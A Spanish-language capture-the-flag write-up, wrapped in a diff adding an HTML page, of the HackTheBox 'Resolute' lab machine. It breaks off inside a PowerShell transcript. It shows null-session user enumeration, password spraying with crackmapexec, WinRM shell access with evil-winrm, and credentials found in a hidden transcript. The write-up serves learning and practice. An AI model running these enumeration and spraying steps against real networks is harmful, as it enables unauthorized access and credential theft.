@@ -1,0 +1,1139 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Resolute</title>
+
+  <meta name="description" content="Resolución de la máquina Resolute de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Resolute">
+  <meta name="twitter:description" content="Resolución de la máquina Resolute de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/resolute.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Resolute">
+  <meta property="og:description" content="Resolución de la máquina Resolute de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/resolute.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/resolute.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Resolute" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-melanie">Shell - melanie</a></li>
+        <li><a href="#shell-ryan">Shell - ryan</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#extra1">Extra - manual dll</a></li>
+        <li><a href="#extra2">Extra - password</a></li>
+        <li><a href="#extra3">Extra - Pwn3d! (ryan)</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/resolute.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Resolute</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos de AD abiertos entre ellos <code class="language-plaintext highlighter-rouge">smb</code>, <code class="language-plaintext highlighter-rouge">kerberos</code> y otros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.169
+Nmap scan report for 10.10.10.169  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49686/tcp open  unknown
+49743/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">megabank.local</code> ademas del nombre que parece es <code class="language-plaintext highlighter-rouge">resolute</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.169
+</span><span class="az">SMB         </span><span class="p">10.10.10.169     445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el <code class="language-plaintext highlighter-rouge">nombre</code> de la máquina que es el DC como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.169 megabank.local resolute.megabank.local"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">rpcclient</code> como usuario nulo nos permite enumerar <code class="language-plaintext highlighter-rouge">usuarios</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ rpcclient</span><span class="p"> -N -U </span><span class="am">'' </span><span class="p">megabank.local
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+rpcclient $></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutando <code class="language-plaintext highlighter-rouge">enumdomusers</code> y aplicando algunas expresiones regulares al output de <code class="language-plaintext highlighter-rouge">rpcclient</code> podemos generar un diccionario con todos los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ rpcclient</span><span class="p"> -N -U </span><span class="am">'' </span><span class="p">megabank.local -c enumdomusers | </span><span class="ve">grep</span><span class="p"> -oP </span><span class="am">'\[\D*?\]'</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -d </span><span class="am">'[]'</span><span class="p"> | </span><span class="ve">tee </span><span class="p">users.txt  
+Administrator
+Guest
+krbtgt
+DefaultAccount
+ryan
+marko
+sunita
+abigail
+marcus
+sally
+fred
+angela
+felicia
+gustavo
+ulf
+stevie
+claire
+paulo
+steve
+annette
+annika
+per
+claude
+melanie
+zach
+simon
+naoki</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Probando un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> para cada uno de ellos vemos que ninguno es vulnerable</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">megabank.local/ -no-pass -usersfile users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)  
+[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sunita doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User annika doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">queryuser</code> podemos ver información de los usuarios, como la <code class="language-plaintext highlighter-rouge">descripción</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">rpcclient $> queryuser Administrator
+	User Name   :	Administrator
+	Full Name   :	
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	
+	Description :	Built-in account for administering the computer/domain  
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	jue, 29 jun 2023 20:13:56 EDT
+	Logoff Time              :	mié, 31 dic 1969 19:00:00 EST
+	Kickoff Time             :	mié, 31 dic 1969 19:00:00 EST
+	Password last set Time   :	jue, 29 jun 2023 20:23:03 EDT
+	Password can change Time :	vie, 30 jun 2023 20:23:03 EDT
+	Password must change Time:	mié, 13 sep 30828 22:48:05 EDT
+	unknown_2[0..31]...
+	user_rid :	0x1f4
+	group_rid:	0x201
+	acb_info :	0x00000210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x00000059
+	padding1[0..7]...
+	logon_hrs[0..21]...
+rpcclient $></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-melanie">
+<br><h3 class="post-title">Shell - melanie</h3><br>
+
+<p class="plain-text">Iterando sobre cada uno de los usuarios podemos ver su <code class="language-plaintext highlighter-rouge">descripción</code>, en este caso en la de <code class="language-plaintext highlighter-rouge">marko</code> encontramos una <code class="language-plaintext highlighter-rouge">contraseña</code> en texto plano de una nueva cuenta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ </span><span class="am">for </span><span class="p">user in </span><span class="sa">$(</span><span class="ve">cat </span><span class="p">users.txt</span><span class="sa">)</span><span class="p">; </span><span class="am">do </span><span class="ve">rpcclient</span><span class="p"> -N -U </span><span class="am">"" </span><span class="p">megabank.local -c </span><span class="am">"queryuser </span><span class="az">$user"</span><span class="p">; </span><span class="am">done</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -E </span><span class="am">"User Name|Description"  </span><span class="p">
+	</span><span class="ro">User Name</span><span class="p">   :	Administrator
+	</span><span class="ro">Description</span><span class="p"> :	Built-in account for administering the computer/domain
+	</span><span class="ro">User Name</span><span class="p">   :	Guest
+	</span><span class="ro">Description</span><span class="p"> :	Built-in account for guest access to the computer/domain
+	</span><span class="ro">User Name</span><span class="p">   :	krbtgt
+	</span><span class="ro">Description</span><span class="p"> :	Key Distribution Center Service Account
+	</span><span class="ro">User Name</span><span class="p">   :	DefaultAccount
+	</span><span class="ro">Description</span><span class="p"> :	A user account managed by the system.
+	</span><span class="ro">User Name</span><span class="p">   :	ryan
+	</span><span class="ro">Description</span><span class="p"> :	
+	</span><span class="ro">User Name</span><span class="p">   :	marko
+	</span><span class="ro">Description</span><span class="p"> :	Account created. Password set to Welcome123!
+	</span><span class="ro">User Name</span><span class="p">   :	sunita
+	</span><span class="ro">Description</span><span class="p"> :	
+	</span><span class="ro">User Name</span><span class="p">   :	abigail
+	</span><span class="ro">Description</span><span class="p"> :	
+	</span><span class="ro">User Name</span><span class="p">   :	marcus
+	</span><span class="ro">Description</span><span class="p"> :	
+..................................................................................</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aplicar un <code class="language-plaintext highlighter-rouge">passwordspray</code> para probar la contraseña de la descripción para toda la lista de <code class="language-plaintext highlighter-rouge">usuarios</code>, el usuario <code class="language-plaintext highlighter-rouge">melanie</code> devuelve que esta es valida</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u users.txt -p Welcome123! --continue-on-success
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\melanie:Welcome123! 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ro">[-] </span><span class="p">megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Aunque ahora tenemos una <code class="language-plaintext highlighter-rouge">credencial</code> valida no nos otorga ningun <code class="language-plaintext highlighter-rouge">privilegio</code> especial entre los recursos <code class="language-plaintext highlighter-rouge">SMB</code>, excepto un par de <code class="language-plaintext highlighter-rouge">READ</code> en recursos por defecto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u melanie -p Welcome123! --shares
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\melanie:Welcome123! 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al probarlas en el protocolo winrm nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> lo que quiere decir que estas credenciales son validas para el <code class="language-plaintext highlighter-rouge">winrm</code> por lo que podemos obtener una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">winrm megabank.local -u melanie -p Welcome123!
+</span><span class="az">SMB         </span><span class="p">megabank.local  5985   RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)  
+</span><span class="az">HTTP        </span><span class="p">megabank.local  5985   RESOLUTE         </span><span class="az">[*] </span><span class="p">http://megabank.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">megabank.local  5985   RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\melanie:Welcome123! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">evil-winrm</code> podemos conectarnos y obtener una powershell como <code class="language-plaintext highlighter-rouge">melanie</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i megabank.local -u melanie -p Welcome123!  
+PS C:\Users\melanie\Documents> </span><span class="am">whoami</span><span class="p">
+megabank\melanie
+PS C:\Users\melanie\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
+070**************************79f
+PS C:\Users\melanie\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-ryan">
+<br><h3 class="post-title">Shell - ryan</h3><br>
+
+<p class="plain-text">Al listar de primeras el directorio <code class="language-plaintext highlighter-rouge">C:\</code> no encontramos nada interesante, sin embargo al usar <code class="language-plaintext highlighter-rouge">-force</code> podemos ver un directorio <code class="language-plaintext highlighter-rouge">PSTranscripts</code> que estaba oculto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\> </span><span class="am">dir</span><span class="p">
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/25/2019   6:19 AM                PerfLogs
+d-r---        9/25/2019  12:39 PM                Program Files
+d-----       11/20/2016   6:36 PM                Program Files (x86)  
+d-r---        12/4/2019   2:46 AM                Users
+d-----        12/4/2019   5:15 AM                Windows
+
+</span><span class="pç">PS C:\> </span><span class="am">dir </span><span class="c1">-force</span><span class="p">
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
+d--hsl        9/25/2019  10:17 AM                Documents and Settings
+d-----        9/25/2019   6:19 AM                PerfLogs
+d-r---        9/25/2019  12:39 PM                Program Files
+d-----       11/20/2016   6:36 PM                Program Files (x86)
+d--h--        9/25/2019  10:48 AM                ProgramData
+d--h--        12/3/2019   6:32 AM                PSTranscripts
+d--hs-        9/25/2019  10:17 AM                Recovery
+d--hs-        9/25/2019   6:25 AM                System Volume Information  
+d-r---        12/4/2019   2:46 AM                Users
+d-----        12/4/2019   5:15 AM                Windows
+-arhs-       11/20/2016   5:59 PM         389408 bootmgr
+-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
+-a-hs-        6/29/2023   5:12 PM      402653184 pagefile.sys
+
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">en el encontramos otro directorio llamado <code class="language-plaintext highlighter-rouge">20191203</code> el cual tiene dentro un <code class="language-plaintext highlighter-rouge">.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\> </span><span class="am">cd </span><span class="p">PSTranscripts
+PS C:\PSTranscripts> </span><span class="am">dir </span><span class="c1">-force</span><span class="p">
+
+    Directory: C:\PSTranscripts
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--h--        12/3/2019   6:45 AM                20191203
+
+PS C:\PSTranscripts> </span><span class="am">cd </span><span class="p">20191203
+PS C:\PSTranscripts\20191203> </span><span class="am">dir </span><span class="c1">-force</span><span class="p">
+
+    Directory: C:\PSTranscripts\20191203
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt  
+
+PS C:\PSTranscripts\20191203></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Este contiene la información de varios <code class="language-plaintext highlighter-rouge">comandos</code>, entre ellos llama la atención un comando <code class="language-plaintext highlighter-rouge">net use</code> donde se autentica como el usuario <code class="language-plaintext highlighter-rouge">ryan</code> contra un recurso smb</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\PSTranscripts\20191203> </span><span class="am">type </span><span class="p">PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+........................................................................................................................  
+**********************
+PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+........................................................................................................................  
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
